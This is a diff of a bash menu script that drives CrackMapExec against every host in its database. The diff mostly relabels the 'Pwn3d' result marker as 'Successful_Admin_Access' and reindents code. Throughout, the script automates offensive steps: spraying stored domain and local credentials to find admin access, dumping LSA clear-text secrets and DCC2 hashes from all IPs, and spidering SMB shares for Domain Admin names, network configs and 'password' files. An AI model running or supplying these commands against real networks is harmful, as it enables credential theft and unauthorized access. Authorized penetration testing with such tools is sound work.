@@ -1,11 +1,15 @@
 #!/bin/bash
 
 echo " "
-echo "Check and Gather tests will be run against all IP addresses of systems within the cmedb."
+echo "All tests will be run against all IP addresses of systems within the cmedb."
 echo "Tests will check for Admin Priv access and display results at the end."
 echo " "
 echo "**** USE OPTION #4 FOR SINGLE IDs, ONLY FOR DOMAIN ACCOUNTS ****"
 echo " "
+echo "Note: This script works only on systems where the /root/.cme/cme.conf"
+echo "file has had the pwn3d_label value changed to = Successful_Admin_Access"
+echo "If your system has the default cme configuration, you can perform a"
+echo "find/replace on this file for Successful_Admin_Access/Pwn3d!"
 echo " "
 
 options=("Check all Domain Accounts in cmedb" "Check all Local-auth Accounts in cmedb" "Check all Domain and Local-auth Accounts (ALL)" "Check single creds ID # (ONLY USE DOMAIN ACCOUNTS)" "Gather LSA Clear-text from all IPs using all Domain and Local-auth Accounts (LSA-ALL)" "Gather DCC2 Hashes from all IPs using all Domain and Local-auth Accounts (DCC2-ALL)" "Display LSA Clear-text of All Previously Gathered" "Display DCC2 Hashes of All Previously Gathered" "Spider file contents for DA account IDs in provided txt file" "Spider filenames for common network configs" "Spider specific pattern for filename search" "Quit")
@@ -65,8 +69,8 @@ do
             echo Results are saved at: /tmp/cme-local-admin-$tag.txt
             echo " "
 
-            #consolidate Pwn3d results into a single file
-            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt
+            #consolidate Successful_Admin_Access results into a single file
+            cat /tmp/cme-creds-check-$tag.txt | grep -a Successful_Admin_Access | tee -a /tmp/cme-local-admin-$tag.txt
 
             echo " "
             echo ==========================================================
@@ -91,8 +95,8 @@ do
             echo Results are saved at: /tmp/cme-local-admin-$tag.txt
             echo " "
 
-            #consolidate Pwn3d results into a single file
-            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt
+            #consolidate Successful_Admin_Access results into a single file
+            cat /tmp/cme-creds-check-$tag.txt | grep -a Successful_Admin_Access | tee -a /tmp/cme-local-admin-$tag.txt
 
             echo " "
             echo ==========================================================
@@ -122,8 +126,8 @@ do
             echo Results are saved at: /tmp/cme-local-admin-$tag.txt
             echo " "
 
-            #consolidate Pwn3d results into a single file
-            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt
+            #consolidate Successful_Admin_Access results into a single file
+            cat /tmp/cme-creds-check-$tag.txt | grep -a Successful_Admin_Access | tee -a /tmp/cme-local-admin-$tag.txt
 
             echo " "
             echo ==========================================================
@@ -146,8 +150,8 @@ do
             echo Results are saved at: /tmp/cme-local-admin-$tag.txt
             echo " "
 
-            #consolidate Pwn3d results into a single file
-            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt
+            #consolidate Successful_Admin_Access results into a single file
+            cat /tmp/cme-creds-check-$tag.txt | grep -a Successful_Admin_Access | tee -a /tmp/cme-local-admin-$tag.txt
 
             echo " "
             echo ==========================================================
@@ -253,52 +257,52 @@ do
 			break
             ;;
         "Spider file contents for DA account IDs in provided txt file")
-                read -p "Location of list of Domain Admins (/path/userlist.txt): " userlist
-                read -p "IP address of File Server (x.x.x.x): " address
-                read -p "File Share Names: " share
-                read -p "Enter creds ID # from the cmedb: " id
-                echo Domain Admins user list: $userlist
-                echo IP Address: $address
-                echo File Share: $share
-                echo Creds ID #: $id
-                # Content Search for DA Usernames
-                for p in $(cat $userlist)
-                do
-                echo ========== $p DA account file pattern search ========== | tee -a /tmp/cme-filescrape-$tag.txt
-                cme smb $address -id $id --spider $share --pattern $p --content | tee -a /tmp/cme-filescrape-$tag.txt
-                done
-                break
-                ;;
+            read -p "Location of list of Domain Admins (/path/userlist.txt): " userlist
+            read -p "IP address of File Server (x.x.x.x): " address
+            read -p "File Share Names: " share
+            read -p "Enter creds ID # from the cmedb: " id
+            echo Domain Admins user list: $userlist
+            echo IP Address: $address
+            echo File Share: $share
+            echo Creds ID #: $id
+            # Content Search for DA Usernames
+            for p in $(cat $userlist)
+            do
+            echo ========== $p DA account file pattern search ========== | tee -a /tmp/cme-filescrape-$tag.txt
+            cme smb $address -id $id --spider $share --pattern $p --content | tee -a /tmp/cme-filescrape-$tag.txt
+            done
+            break
+            ;;
         "Spider filenames for common network configs")
-                read -p "IP address of File Server (x.x.x.x): " address
-                read -p "File Share Names: " share
-                read -p "Enter creds ID # from the cmedb: " id
-                echo IP Address: $address
-                echo File Share: $share
-                echo Creds ID #: $id
-                echo Wordlist taken from "network.txt" file
-                # Content Search for Network Config Files
-                for p in $(cat files/network.txt)
-                do
-                echo ========== $p file pattern search ========== | tee -a /tmp/cme-filescrape-$tag.txt
-                cme smb $address -id $id --spider $share --pattern $p --content | tee -a /tmp/cme-filescrape-$tag.txt
-                done
-                break
-                ;;
+            read -p "IP address of File Server (x.x.x.x): " address
+            read -p "File Share Names: " share
+            read -p "Enter creds ID # from the cmedb: " id
+            echo IP Address: $address
+            echo File Share: $share
+            echo Creds ID #: $id
+            echo Wordlist taken from "network.txt" file
+            # Content Search for Network Config Files
+            for p in $(cat files/network.txt)
+            do
+            echo ========== $p file pattern search ========== | tee -a /tmp/cme-filescrape-$tag.txt
+            cme smb $address -id $id --spider $share --pattern $p --content | tee -a /tmp/cme-filescrape-$tag.txt
+            done
+            break
+            ;;
         "Spider specific pattern for filename search")
-                read -p "Word to search in filenames (exp: password): " filename
-                read -p "IP address of File Server (x.x.x.x): " address
-                read -p "File Share Names: " share
-                read -p "Enter creds ID # from the cmedb: " id
-                echo Filename pattern: $filename
-                echo IP Address: $address
-                echo File Share: $share
-                echo Creds ID #: $id
-                # Filename Pattern Search
-                echo ========== $filename Filename pattern search  ========== | tee -a /tmp/cme-filescrape-$tag.txt
-                cme smb $address -id $id --spider $share --pattern $filename | tee -a /tmp/cme-filescrape-$tag.txt
-                break
-                ;;
+            read -p "Word to search in filenames (exp: password): " filename
+            read -p "IP address of File Server (x.x.x.x): " address
+            read -p "File Share Names: " share
+            read -p "Enter creds ID # from the cmedb: " id
+            echo Filename pattern: $filename
+            echo IP Address: $address
+            echo File Share: $share
+            echo Creds ID #: $id
+            # Filename Pattern Search
+            echo ========== $filename Filename pattern search  ========== | tee -a /tmp/cme-filescrape-$tag.txt
+            cme smb $address -id $id --spider $share --pattern $filename | tee -a /tmp/cme-filescrape-$tag.txt
+            break
+            ;;
         "Quit")
             break
             ;;
